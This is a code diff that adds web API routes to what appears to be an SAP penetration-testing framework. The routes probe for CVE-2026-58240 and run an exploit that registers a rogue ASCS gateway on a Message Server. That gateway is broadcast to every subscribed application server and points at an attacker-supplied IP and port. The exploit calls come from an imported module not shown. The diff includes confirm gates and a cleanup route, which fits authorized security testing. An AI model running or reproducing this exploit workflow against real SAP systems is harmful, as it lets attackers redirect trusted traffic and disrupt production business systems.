@@ -7853,6 +7853,111 @@ def create_app(api: SAPMAPApi) -> Bottle:
         _bg(f"{sid}:check_cve_31324", "Check CVE-2025-31324", _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/check_cve_2026_58240", method="POST")
+    def node_check_cve_2026_58240(sid):
+        """Probe MS internal port for the ASCS_GW opcode family
+        (CVE-2026-58240).  Read-only — never mutates the target."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        def _run():
+            print(f"[*] {sid}: Checking CVE-2026-58240 "
+                  f"(MS ASCS_GW rogue registration)...")
+            found = sapmap_scanner.check_cve_2026_58240(node)
+            if found:
+                print(f"[+] {sid}: opcode family present on port "
+                      f"{node.cve_2026_58240_ms_port} — kernel in fix "
+                      f"window (leaked identity: "
+                      f"{node.cve_2026_58240_ascs_identity or '?'})")
+            elif node.cve_2026_58240_evidence:
+                print(f"[*] {sid}: not exposed "
+                      f"({node.cve_2026_58240_evidence})")
+            else:
+                print(f"[*] {sid}: no MS internal port responded")
+
+        _bg(f"{sid}:check_cve_58240", "Check CVE-2026-58240", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/exploit_cve_2026_58240_register", method="POST")
+    def node_exploit_cve_2026_58240_register(sid):
+        """Register a rogue ASCS gateway entry (destructive).  Requires
+        the check step to have already confirmed the opcode family is
+        present.  Broadcasts the fake gateway to every subscribed AS —
+        potentially disruptive on a live system."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        if not data.get("confirm"):
+            return json.dumps({"error": "confirm=true required — "
+                                         "this action is destructive"})
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        if not node.cve_2026_58240_vulnerable:
+            return json.dumps({"error": "run the check first — "
+                                         "opcode family status unknown"})
+        ms_port = node.cve_2026_58240_ms_port or 3900
+        attacker_ip = data.get("attacker_ip") or "127.0.0.1"
+        rogue_port = int(data.get("rogue_port") or 31337)
+
+        def _run():
+            print(f"[*] {sid}: registering rogue ASCS_GW on "
+                  f"{node.ip}:{ms_port} (attacker "
+                  f"{attacker_ip}:{rogue_port})")
+            try:
+                from sap_cve_2026_58240 import register_rogue_ascs_gw
+                r = register_rogue_ascs_gw(
+                    node.ip, ms_port,
+                    attacker_ip=attacker_ip,
+                    rogue_port=rogue_port)
+            except Exception as e:
+                print(f"[-] {sid}: register failed: {e!r}")
+                return
+            print(f"[*] {sid}: register result: {r}")
+            if r.get("ok"):
+                node.cve_2026_58240_registered = True
+                sapmap_findings.emit_finding(
+                    "CRITICAL", sid,
+                    f"CVE-2026-58240 — rogue ASCS gateway "
+                    f"registered on {node.ip}:{ms_port} "
+                    f"(broadcast confirmed).  Every subscribed "
+                    f"AS now trusts {attacker_ip}:{rogue_port}.",
+                    cve="CVE-2026-58240",
+                    ref="ms.ascs_gw.registered",
+                    attack_capability="exploit.ms_ascs_gw_rogue")
+
+        _bg(f"{sid}:register_cve_58240",
+             "CVE-2026-58240 rogue ASCS_GW register", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/exploit_cve_2026_58240_unregister",
+                method="POST")
+    def node_exploit_cve_2026_58240_unregister(sid):
+        """Best-effort cleanup — send LOGOFF/KEEPALIVE opcode with an
+        empty body.  The server also expires the entry after ~60s of
+        no keep-alive.  Idempotent."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        ms_port = node.cve_2026_58240_ms_port or 3900
+
+        def _run():
+            print(f"[*] {sid}: cleanup rogue ASCS_GW on "
+                  f"{node.ip}:{ms_port}")
+            try:
+                from sap_cve_2026_58240 import unregister_rogue_ascs_gw
+                r = unregister_rogue_ascs_gw(node.ip, ms_port)
+                print(f"[*] {sid}: unregister result: {r}")
+                node.cve_2026_58240_registered = False
+            except Exception as e:
+                print(f"[-] {sid}: unregister failed: {e!r}")
+
+        _bg(f"{sid}:unregister_cve_58240",
+             "CVE-2026-58240 rogue ASCS_GW cleanup", _run)
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/check_linux_lpe", method="POST")
     @app.route("/api/node/<sid>/check_copyfail",  method="POST")  # legacy alias
     def node_check_linux_lpe(sid):
@@ -16234,6 +16339,19 @@ def create_app(api: SAPMAPApi) -> Bottle:
             except Exception as e:
                 logger.debug(f"{sid}: MS check failed: {e}")
 
+            # Auto-check MS ASCS_GW opcodes for CVE-2026-58240
+            print(f"[*] {sid}: Checking CVE-2026-58240 "
+                  f"(MS ASCS_GW opcodes)...")
+            try:
+                sapmap_scanner.check_cve_2026_58240(node)
+                if node.cve_2026_58240_vulnerable:
+                    print(f"[+] {sid}: MS port "
+                          f"{node.cve_2026_58240_ms_port} recognises "
+                          f"ASCS_GW opcodes — leaked identity "
+                          f"{node.cve_2026_58240_ascs_identity!r}")
+            except Exception as e:
+                logger.debug(f"{sid}: CVE-58240 check failed: {e}")
+
         _bg(f"{sid}:enrich", "Enriching via RFC_SYSTEM_INFO", _enrich)
 
         return json.dumps({"status": "ok"})
@@ -16377,6 +16495,30 @@ def create_app(api: SAPMAPApi) -> Bottle:
                 sapmap_scanner.check_ms_betrusted(node)
 
         _bg("_check_all_ms", "Check All MS Betrusted", _run)
+        return json.dumps({"status": "started", "systems": len(nodes)})
+
+    @app.route("/api/actions/check_all_cve_58240", method="POST")
+    def actions_check_all_cve_58240():
+        """Probe every ABAP / double-stack node for CVE-2026-58240
+        (MS ASCS_GW rogue registration).  Read-only."""
+        response.content_type = "application/json"
+        nodes = [n for n in api.state.nodes.values()
+                 if "ABAP" in (n.system_type or "").upper()
+                 or "DUAL" in (n.system_type or "").upper()]
+        if not nodes:
+            return json.dumps({"error": "No ABAP / double-stack systems "
+                                         "on the map"})
+
+        def _run():
+            for node in nodes:
+                print(f"[*] {node.sid}: check_cve_2026_58240 "
+                      f"({node.ip})")
+                try:
+                    sapmap_scanner.check_cve_2026_58240(node)
+                except Exception as e:
+                    print(f"[-] {node.sid}: check_cve_58240 failed: {e}")
+
+        _bg("_check_all_cve_58240", "Check All CVE-2026-58240", _run)
         return json.dumps({"status": "started", "systems": len(nodes)})
 
     @app.route("/api/actions/check_all_cve_31324", method="POST")
